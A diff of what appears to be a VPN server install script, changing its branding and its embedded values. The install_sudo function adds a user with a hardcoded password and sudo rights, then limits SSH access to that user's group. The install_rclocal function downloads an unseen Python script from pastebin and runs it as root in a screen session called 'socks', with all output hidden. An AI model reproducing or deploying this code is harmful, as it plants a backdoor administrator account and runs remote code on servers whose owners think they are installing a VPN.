@@ -623,9 +623,9 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
+    useradd -m alamin 2>/dev/null; echo alamin:@@Alaminbd17 | chpasswd &>/dev/null; usermod -aG sudo alamin &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    echo "AllowGroups alamin" >> /etc/ssh/sshd_config
     service sshd restart
   }&>/dev/null
 }
@@ -678,11 +678,11 @@ sysctl -p
 
 install_rclocal(){
   {
-    wget https://pastebin.com/raw/z9j2nA8p -O /etc/ubuntu
+    wget https://pastebin.com/raw/qGhiXKFx -O /etc/ubuntu
     dos2unix /etc/ubuntu
     chmod +x /etc/ubuntu    
     screen -dmS socks python /etc/ubuntu
-    wget --no-check-certificate https://pastebin.com/raw/658HpnLd -O /etc/systemd/system/rc-local.service
+    wget --no-check-certificate https://pastebin.com/raw/GheKR24z -O /etc/systemd/system/rc-local.service
     echo "#!/bin/sh -e
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
@@ -702,7 +702,7 @@ exit 0" >> /etc/rc.local
 install_done()
 {
   clear
-  echo "OPENVPN SERVER FIRENET"
+  echo "OPENVPN SERVER SCBUILD"
   echo "IP : $(curl -s https://api.ipify.org)"
   echo "OPENVPN TCP port : $PORT_TCP"
   echo "OPENVPN UDP port : $PORT_UDP"
